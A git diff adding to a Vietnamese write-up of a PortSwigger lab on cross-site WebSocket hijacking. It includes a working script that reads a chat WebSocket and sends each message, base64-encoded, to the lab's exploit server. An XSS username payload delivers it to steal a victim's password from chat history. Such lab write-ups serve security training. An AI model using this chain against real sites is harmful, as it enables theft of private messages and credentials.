@@ -222,43 +222,78 @@ Tôi nghĩ tôi sẽ lấy cookie của các user khác:
 
 ![image](https://github.com/user-attachments/assets/039ea87c-c5eb-488f-90d6-d8c1c026d035)
 
-Đợi 1 lúc thì không thấy cookie nào cả 
+Đợi 1 lúc thì không thấy cookie nào cả
 
+![image](https://github.com/user-attachments/assets/7bcda690-b8c7-40e5-88f4-80b16f31f630)
 
+Để ý thì ở phần cookie có SameSite=Strict, là một giá trị của thuộc tính SameSite trong cookie, giúp kiểm soát cách trình duyệt gửi cookie trong các yêu cầu cross-site
 
+![image](https://github.com/user-attachments/assets/e41b754c-4979-4acf-bd5f-8b6c87012edd)
 
+```
+<script>
+var webSocket = new WebSocket("wss://0a2c002b03262a4c810e1bc900a60045.web-security-academy.net/chat");
 
+webSocket.onopen = function (evt) {
+webSocket.send("READY")
+};
 
+webSocket.onmessage = function (evt) {
+var message = evt.data;
+fetch("https://exploit-0a9a00e003622a2481f01afc01f600cf.exploit-server.net/exploit?message=" + btoa(message)
+);
+};
+</script>
+```
 
+Tôi chèn vào server exploit đoạn này, đầu tiên là khởi tạo WebSocket, sau đó là gửi READY, mỗi khi WebSocket nhận được tin nhắn (onmessage), nội dung tin nhắn (evt.data) được lưu vào biến message và cuối cùng là gửi về server exploit
 
+![image](https://github.com/user-attachments/assets/2cca7428-a396-4151-b089-dbe84005e561)
 
+Check access log thì có đoạn message được encode base64
 
+![image](https://github.com/user-attachments/assets/73b06d86-a9f6-4927-843f-456baa52871c)
 
+Nếu để ý phần response của /resources/js/chat.js thì có Access-Control-Allow-Origin nên xss để lấy cookie là điều không thể:
 
+![image](https://github.com/user-attachments/assets/aed8f69e-b776-42f0-a93c-f74021bb94d9)
 
+Nếu đi theo đường link này thì sẽ có 1 cái chỗ để login 
 
+![image](https://github.com/user-attachments/assets/0c250d22-2c1d-4507-9ecc-58263504b08f)
 
+Và phần username bị dính xss sau khi tôi dùng `<script>alert(window.origin)</script>`:
 
+![image](https://github.com/user-attachments/assets/7755a48d-e7b8-406a-adb0-258db8b4e2cf)
 
+Tôi encode url cái mà tôi vừa để trên exploit lại, sau đó đưa vào username 
 
+![image](https://github.com/user-attachments/assets/b9f5ba9e-83ef-4598-811e-d984964f80f5)
 
+![image](https://github.com/user-attachments/assets/1f0701c6-fab0-45be-b1b8-6a5b785212f7)
 
+Chuyển sang method GET thì vẫn gửi được
 
+![image](https://github.com/user-attachments/assets/a23378e3-9610-445b-aac9-edbf528a9e76)
 
+Làm cái document.location và để đường dẫn kia vào 
 
+![image](https://github.com/user-attachments/assets/5f84a31e-1f6f-4144-8496-d8da7d7a4cd6)
 
+Ấn gửi và vào access log để xem:
 
+![image](https://github.com/user-attachments/assets/4ac5015f-7e3b-4c97-8c77-bac972c5465a)
 
+Và mấy cái base64 sau khi decode ra thì là 1 số đoạn của chat:
 
+![image](https://github.com/user-attachments/assets/d72e5688-d0f9-4c00-9921-0e517f78cf5b)
 
+Và trong đoạn chat có chứa password của carlos
 
+![image](https://github.com/user-attachments/assets/837163ef-eb7b-413a-aa65-2f6497f660b0)
 
-
-
-
-
-
-
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
